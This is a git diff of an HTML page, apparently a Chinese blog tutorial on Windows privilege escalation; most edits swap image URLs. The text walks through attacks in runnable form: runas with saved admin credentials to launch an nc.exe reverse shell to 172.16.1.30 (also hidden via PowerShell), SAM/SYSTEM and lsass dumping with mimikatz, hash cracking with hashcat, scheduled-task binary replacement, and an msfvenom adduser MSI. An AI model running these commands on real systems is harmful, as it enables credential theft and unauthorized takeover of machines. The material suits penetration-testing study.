 <p><font style="color:rgb(36, 41, 47);">除了 Windows 自动登录功能外，某些程序和第三方软件也可能会以不安全的方式在注册表中存储凭据，这些第三方软件的注册表路径如下</font></p>
 <p><font style="color:rgb(51, 51, 51);">reg query “HKLM\SYSTEM\Current\ControlSet\Services\SNMP”</font></p>
 <p><font style="color:rgb(51, 51, 51);">reg query “HKCU\Software\SimonTatham\PuTTY\Sessions”</font></p>
@@ -1201,18 +1210,18 @@
 <p><font style="color:rgb(51, 51, 51);">可以使用以下命令查看存储的凭据：</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762847417729-8b50a8cb-a69d-4c74-a2d9-c0b8480eda4f-517476.png" alt="1762847417729-8b50a8cb-a69d-4c74-a2d9-c0b8480eda4f.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762847417729-8b50a8cb-a69d-4c74-a2d9-c0b8480eda4f.png"></p>
 <p><font style="color:rgb(51, 51, 51);">可以看到，本地管理员账户的凭证已经存储在凭证管理器中，因此可以使用该身份借助 runas 命令去执行命令啦。</font></p>
 <p><font style="color:rgb(85, 85, 85);">凭证管理器的枚举，对于 PowerUp 和 winPEAS 来说都不能够帮到我们，因此，凭证管理器的枚举需要我们手动进行。【PEAS 虽然支持枚举存储的凭证，但使用效果不佳，总是失败。】</font></p>
 <p><font style="color:rgb(51, 51, 51);">虽然这并非真正的“密码搜寻”，但由于用户的密码被保存，而它确实可以为我们提供以其它用户身份运行命令的能力。因此，这实际上等同于在系统中查找某个用户的凭据。</font></p>
 <p><font style="color:rgb(51, 51, 51);">如果尝试运行任意命令（例如“whoami”）时，我们需要将输出内容重定向到文件以读取它。这是因为 runas 会在另外新起的窗口中去执行命令，命令执行结束新起的窗口就被关闭了，因此输出的内容并不会呈现在当前的 shell 窗口中。</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator &quot;cmd.exe /c whoami &gt; C:\temp\whoami.txt&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762847417968-e6c97d82-0145-4f66-b309-4cb70a90096f-401044.png" alt="1762847417968-e6c97d82-0145-4f66-b309-4cb70a90096f.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762847417968-e6c97d82-0145-4f66-b309-4cb70a90096f.png"></p>
 <p><font style="color:rgb(51, 51, 51);">从上面可以看到，我们确实是以本地管理员帐户的身份运行了 whoami 命令！接下来，就可以使用 runas 来借助 nc.exe 工具来获取反向 shell，命令如下：</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator &quot;c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762847417707-26ee99b2-8e71-4faf-b27f-d503838f567f-264604.png" alt="1762847417707-26ee99b2-8e71-4faf-b27f-d503838f567f.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762847417707-26ee99b2-8e71-4faf-b27f-d503838f567f.png"></p>
 <p><font style="color:rgb(51, 51, 51);">值得一提的是，这可能会在受害者机器上打开 cmd 窗口，导致用户可以轻松关闭它。为此，我们可以使用 PowerShell 从隐藏窗口执行命令，从而增加隐蔽性。这样，受害者那边就不会打开任何窗口，也就不会那么轻松的就杀死我们的 shell。</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /env /noprofile /savecred /user:JUGG-efrost\administrator &quot;powershell.exe -w hidden -c c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>
 
@@ -1227,10 +1236,10 @@
 <li><font style="color:rgb(51, 51, 51);">C:\Windows\system32\sysprep.xml</font></li>
 <li><font style="color:rgb(51, 51, 51);">C:\Windows\system32\sysprep\sysprep.xml</font></li>
 </ul>
-<p><font style="color:rgb(36, 41, 47);">递归式搜索当前目录中以</font><code><font style="color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);">pass</font></code><font style="color:rgb(36, 41, 47);">为名的文件，或以</font><code><font style="color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);">.config</font></code><font style="color:rgb(36, 41, 47);">结尾：</font></p>
+<p><font style="color:rgb(36, 41, 47);">递归式搜索当前目录中以</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;pass&lt;/font&gt;</code><font style="color:rgb(36, 41, 47);">为名的文件，或以</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;.config&lt;/font&gt;</code><font style="color:rgb(36, 41, 47);">结尾：</font></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /s *pass* == *.config</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(36, 41, 47);">递归式搜索当前目录中包含”password”一词的文件，最后也以任何一个</font><code><font style="color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);">.xml</font></code><font style="color:rgb(36, 41, 47);">，</font><code><font style="color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);">.ini</font></code><font style="color:rgb(36, 41, 47);">，</font><code><font style="color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);">.txt</font></code></p>
+<p><font style="color:rgb(36, 41, 47);">递归式搜索当前目录中包含”password”一词的文件，最后也以任何一个</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;.xml&lt;/font&gt;</code><font style="color:rgb(36, 41, 47);">，</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;.ini&lt;/font&gt;</code><font style="color:rgb(36, 41, 47);">，</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;.txt&lt;/font&gt;</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /si password *.xml *.ini *.txt</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\winPEASany.exe quiet cmd searchfast filesinfo</span><br><span class="line">  或者PowerUp</span><br></pre></td></tr></table></figure>
@@ -1247,14 +1256,14 @@
 <p>reg save hklm\sam C:\hash\sam.hive</p>
 <p>reg save hklm\system C:\hash\system.hive</p>
 <p><font style="color:rgb(77, 77, 77);">将上述获得的sys.hiv和sam.hiv文件复制到mimikatz所在文件夹，运行mimikatz，</font></p>
-<p><font style="color:rgb(77, 77, 77);">输入</font><code><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">lsadump::sam /system:sys.hiv /sam:sam.hiv</font></code><font style="color:rgb(77, 77, 77);">，即可导出所有用户密码hash</font></p>
+<p><font style="color:rgb(77, 77, 77);">输入</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;lsadump::sam /system:sys.hiv /sam:sam.hiv&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">，即可导出所有用户密码hash</font></p>
 <h4 id="下载信用套件："><a href="#下载信用套件：" class="headerlink" title="下载信用套件："></a><font style="color:rgb(36, 41, 47);">下载信用套件：</font></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/Neohapsis/creddump7.git</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="运行对SAM和系统文件的工具来提取哈希："><a href="#运行对SAM和系统文件的工具来提取哈希：" class="headerlink" title=" 运行对SAM和系统文件的工具来提取哈希："></a><font style="color:rgb(36, 41, 47);"> 运行对SAM和系统文件的工具来提取哈希：</font></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 creddump7/pwdump.py SYSTEM SAM</span><br></pre></td></tr></table></figure>
 
 <h4 id="使用hashcat破解管理员用户哈希："><a href="#使用hashcat破解管理员用户哈希：" class="headerlink" title="使用hashcat破解管理员用户哈希："></a><font style="color:rgb(36, 41, 47);">使用hashcat破解管理员用户哈希：</font></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">1000</span> --force  a9fdfa038c4b75ebc76dc855dd74f0da  /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
 
-<h5 id="在-Windows-运行时，文件已锁定。"><a href="#在-Windows-运行时，文件已锁定。" class="headerlink" title="在 Windows 运行时，文件已锁定。"></a><font style="color:rgb(36, 41, 47);">在 Windows 运行时，文件已锁定。</font></h5><p><font style="color:rgb(36, 41, 47);">文件的备份可能存在于</font><code><font style="color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);">C:\Windows\Repair</font></code><font style="color:rgb(36, 41, 47);"> or </font><code><font style="color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);">C:\Windows\System32\config\RegBack directories</font></code></p>
+<h5 id="在-Windows-运行时，文件已锁定。"><a href="#在-Windows-运行时，文件已锁定。" class="headerlink" title="在 Windows 运行时，文件已锁定。"></a><font style="color:rgb(36, 41, 47);">在 Windows 运行时，文件已锁定。</font></h5><p><font style="color:rgb(36, 41, 47);">文件的备份可能存在于</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;C:\Windows\Repair&lt;/font&gt;</code><font style="color:rgb(36, 41, 47);"> or </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;C:\Windows\System32\config\RegBack directories&lt;/font&gt;</code></p>
 <h5 id="lsass-exe-进程"><a href="#lsass-exe-进程" class="headerlink" title="lsass.exe 进程"></a><font style="color:rgb(77, 77, 77);">lsass.exe 进程</font></h5><p><font style="color:rgb(77, 77, 77);">lsass.exe是一个系统进程，用于本地安全认证，用户的hash信息就存在lsass.exe程序内存中。我们一般就是以lsass.exe进程为目标，使用工具从该进程中dump出已登录用户的hash相关信息</font></p>
 <p><font style="color:rgb(77, 77, 77);">但可以通过注册表导出sam和system文件</font></p>
 <h5 id="procdump64-微软自己的工具-mimikatz"><a href="#procdump64-微软自己的工具-mimikatz" class="headerlink" title="procdump64(微软自己的工具)+mimikatz"></a><font style="color:rgb(79, 79, 79);">procdump64(</font><font style="color:rgb(77, 77, 77);">微软自己的工具</font><font style="color:rgb(79, 79, 79);">)+mimikatz</font></h5><p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p>
@@ -1266,20 +1275,20 @@
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk -dqv <span class="string">&quot;C:/Program Files/Snipaste-1.16.2-x86&quot;</span> -accepteula</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762862422019-53b01b90-902a-48e5-9847-b7a76c576f1f-657044.png" alt="1762862422019-53b01b90-902a-48e5-9847-b7a76c576f1f.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762862422019-53b01b90-902a-48e5-9847-b7a76c576f1f.png"></p>
 <ol>
 <li><font style="color:rgb(51, 51, 51);">具有写入权限，将恶意程序放入对应目录下。</font></li>
 </ol>
-<p><img src="/../img/spj672lzkVrm2XkE/1762862422271-786151b2-d924-49b8-abc3-8c0e2e53585e-293798.png" alt="1762862422271-786151b2-d924-49b8-abc3-8c0e2e53585e.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762862422271-786151b2-d924-49b8-abc3-8c0e2e53585e.png"></p>
 <ol>
 <li><font style="color:rgb(51, 51, 51);">执行重启命令。当计划任务下次执行时，就会以高权限运行恶意程序，进而完成提权。成功提权后记得修改回配置。</font></li>
 </ol>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shutdown</span> -r -t <span class="number">0</span></span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgb(31, 35, 40);"></font></p>
-<p><font style="color:rgb(31, 35, 40);">在Windows中可以利用计划任务覆盖原有的程序来进行替换\ </font><font style="color:rgb(31, 35, 40);">可以使用如下命令查看计算机上的计划任务。\ </font><code><font style="color:rgb(31, 35, 40);background-color:rgba(175, 184, 193, 0.2);">schtasks /query /fo LIST /v</font></code></p>
+<p><font style="color:rgb(31, 35, 40);">在Windows中可以利用计划任务覆盖原有的程序来进行替换<br></font><font style="color:rgb(31, 35, 40);">可以使用如下命令查看计算机上的计划任务。<br></font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;schtasks /query /fo LIST /v&lt;/font&gt;</code></p>
 <p><font style="color:rgb(31, 35, 40);">使用</font><strong><font style="color:rgb(31, 35, 40);">如下命令可以查看指定目录的权限配置情况</font></strong><font style="color:rgb(31, 35, 40);">。如果我们</font><strong><font style="color:rgb(31, 35, 40);">对以高权限运行的任务所在目录具有写入权限</font></strong><font style="color:rgb(31, 35, 40);">，就可以使用</font><strong><font style="color:rgb(31, 35, 40);">恶意程序覆盖掉原来的程序</font></strong><font style="color:rgb(31, 35, 40);">。当计划任务下次执行时，就会以高权限运行恶意程序，进而完成提权。</font></p>
-<p><code><font style="color:rgb(31, 35, 40);background-color:rgba(175, 184, 193, 0.2);">accesschk.exe -dqv &quot;D:test&quot; -accepteula</font></code></p>
+<p><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;accesschk.exe -dqv &quot;D:test&quot; -accepteula&lt;/font&gt;</code></p>
 <h2 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a><font style="color:rgb(36, 41, 47);">用户权限</font></h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font style="color:rgb(36, 41, 47);">前言</font></h3><p><font style="color:rgb(36, 41, 47);">在Windows中，可以为用户帐户和组分配特定的“特权”。</font></p>
 <p><font style="color:rgb(36, 41, 47);">这些特权授予对某些能力的访问权。其中一些能力可以用来将我们的总体特权提升到系统的权限。</font></p>
 <h3 id="列出用户权限"><a href="#列出用户权限" class="headerlink" title="列出用户权限"></a><font style="color:rgb(36, 41, 47);">列出用户权限</font></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
@@ -1311,12 +1320,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：at 时间 命令</span><br><span class="line">例子：at 10:45PM calc.exe</span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。我们可以通过 “&#x2F;interactive”开启界面交互模式：</font></p>
-<p><img src="/../img/spj672lzkVrm2XkE/1762855939632-123d982f-aca4-46ba-b202-16cd9b60bf08-767876.png" alt="1762855939632-123d982f-aca4-46ba-b202-16cd9b60bf08.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855939632-123d982f-aca4-46ba-b202-16cd9b60bf08.png"></p>
 <p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">在得到一个system的cmd之后，使用 taskmgr 命令调用任务管理器，此时的任务管理器是system权限，然后kill掉explore进程，再使用任务管理器新建explore进程，将会得到一个system的桌面环境</font></p>
-<p><img src="/../img/spj672lzkVrm2XkE/1762855939767-ec76a1d0-9cf6-4ae1-a244-a4f2218986b4-716622.png" alt="1762855939767-ec76a1d0-9cf6-4ae1-a244-a4f2218986b4.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855939767-ec76a1d0-9cf6-4ae1-a244-a4f2218986b4.png"></p>
 <h4 id="at-配合-msf提权"><a href="#at-配合-msf提权" class="headerlink" title="at 配合 msf提权"></a><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">at 配合 msf提权</font></h4><p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">msf下生成木马文件，获取会话之后，然后进入shell   at命令执行运行程序，</font></p>
 <p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">再开个窗口监听这个端口，上线后即为system</font></p>
-<p><img src="/../img/spj672lzkVrm2XkE/1762855939785-92a92d92-e2f7-46e1-a23e-06c5e41dcfd9-273796.png" alt="1762855939785-92a92d92-e2f7-46e1-a23e-06c5e41dcfd9.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855939785-92a92d92-e2f7-46e1-a23e-06c5e41dcfd9.png"></p>
 <h3 id="windows-7-8、03-08、12-16"><a href="#windows-7-8、03-08、12-16" class="headerlink" title="windows 7&#x2F;8、03&#x2F;08、12&#x2F;16"></a><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">windows 7&#x2F;8、03&#x2F;08、12&#x2F;16</font></h3><h4 id="sc命令提权"><a href="#sc命令提权" class="headerlink" title="sc命令提权"></a><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">sc命令提权</font></h4><p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">关于sc命令： SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br></pre></td></tr></table></figure>
 
@@ -1334,7 +1343,7 @@
 <figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ERROR:</span> The system was unable <span class="keyword">to</span> find the specified registry <span class="keyword">key</span> <span class="built_in">or</span> value.</span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">如果存在漏洞，上面将输出以下内容:</font></p>
-<p><img src="/../img/spj672lzkVrm2XkE/1762855990379-47efadbf-3f57-4e3e-a4dc-6a145a3b970f-093483.png" alt="1762855990379-47efadbf-3f57-4e3e-a4dc-6a145a3b970f.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855990379-47efadbf-3f57-4e3e-a4dc-6a145a3b970f.png"></p>
 <p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">然后我们使用msfvenom生成msi文件，进行提权</font></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msi</span><br><span class="line"></span><br><span class="line">msiexec /quiet /qn /i C:\programdata\rotten.msi</span><br><span class="line"><span class="comment"># /quiet    安装过程中禁止向用户发送消息</span></span><br><span class="line"><span class="comment"># /qn       不使用GUI</span></span><br><span class="line"><span class="comment"># /i        安装程序</span></span><br><span class="line">msf下的自动模块</span><br><span class="line">exploit/windows/local/always_install_elevated</span><br></pre></td></tr></table></figure>
 
@@ -1348,11 +1357,8 @@
 <p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。</font></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#msf模块</span></span><br><span class="line">post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762855990362-eb9ca6da-f4d1-4e68-9344-b88913780a1e-992928.png" alt="1762855990362-eb9ca6da-f4d1-4e68-9344-b88913780a1e.png"></p>
-<h2 id="第三方软件漏洞提权"><a href="#第三方软件漏洞提权" class="headerlink" title="第三方软件漏洞提权"></a>第三方软件漏洞提权</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><blockquote>
-<p>更新: 2025-11-17 11:43:05<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/owwvd1130r1klgal">https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/owwvd1130r1klgal</a></p>
-</blockquote>
-</article>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762855990362-eb9ca6da-f4d1-4e68-9344-b88913780a1e.png"></p>
+<h2 id="第三方软件漏洞提权"><a href="#第三方软件漏洞提权" class="headerlink" title="第三方软件漏洞提权"></a>第三方软件漏洞提权</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3></article>
 <div class="article-footer">
 
 </div>
@@ -1369,7 +1375,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-%E6%8F%90%E6%9D%83"><span class="toc-text">windows 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E6%A8%A1%E5%9E%8B"><span class="toc-text">1.用户和权限模型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%EF%BC%88User-Account%EF%BC%89%EF%BC%9AWindows-%E7%B3%BB%E7%BB%9F%E4%B8%AD%EF%BC%8C%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E6%8B%A5%E6%9C%89%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9D%83%E9%99%90%E5%92%8C%E8%A7%92%E8%89%B2%E3%80%82"><span class="toc-text">用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8-ACL"><span class="toc-text">2.访问控制列表 (ACL)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6-SID"><span class="toc-text">3.安全标识符 (SID)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2-SID"><span class="toc-text">查询 SID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SID-%E8%A7%A3%E6%9E%90"><span class="toc-text">SID 解析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-text">4.基本命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">5.常用命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%8F%8D%E5%BC%B9shell-Win-192-168-129-161-KaLi-192-168-129-152"><span class="toc-text">Windows反弹shell  Win 192.168.129.161  KaLi  192.168.129.152</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powercat"><span class="toc-text">powercat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nishang"><span class="toc-text">nishang</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89powershell%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">自定义powershell函数反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E5%8F%8D%E5%BC%B9"><span class="toc-text">MSF反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">python反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">Windows 内核溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E6%89%8B%E5%B7%A5"><span class="toc-text">一：手工</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-msf%E8%87%AA%E5%8A%A8-%E5%8F%8D%E5%BC%B9shell%E5%90%8E"><span class="toc-text">二:msf自动(反弹shell后)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83"><span class="toc-text">错误的系统配置提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-text">1.不安全的服务权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%AA%E5%BC%95%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-text">2.未引用的服务路径</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%90%E8%A1%8CwinPEAS%E4%BB%A5%E6%A3%80%E6%9F%A5%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%EF%BC%9A"><span class="toc-text">1.运行winPEAS以检查服务配置错误：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8F%91%E7%8E%B0%E2%80%9Dunquotedsvc%E2%80%9D%E6%9C%8D%E5%8A%A1%E6%9C%89%E4%B8%80%E4%B8%AA%E6%9C%AA%E5%BC%95%E7%94%A8%E7%9A%84%E8%B7%AF%E5%BE%84-%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B9%9F-%E5%8C%85%E5%90%AB-%E7%A9%BA%E6%A0%BC%EF%BC%9A"><span class="toc-text">2. 发现”unquotedsvc”服务有一个未引用的路径 ，其中也 包含 空格：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8sc%E7%A1%AE%E8%AE%A4%E6%AD%A4%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">3. 使用sc确认此问题：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8accesschk-exe%E6%A3%80%E6%9F%A5%E5%86%99%E5%85%A5%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-text">4.使用accesschk.exe检查写入权限：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E5%A4%8D%E5%88%B6%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8F%8D%E5%90%91%E5%A4%96%E5%A3%B3%E5%B9%B6%E9%80%82%E5%BD%93%E9%87%8D%E5%91%BD%E5%90%8D"><span class="toc-text">5.复制可执行的反向外壳并适当重命名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">6.启动服务触发漏洞进行反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90%E5%BC%B1"><span 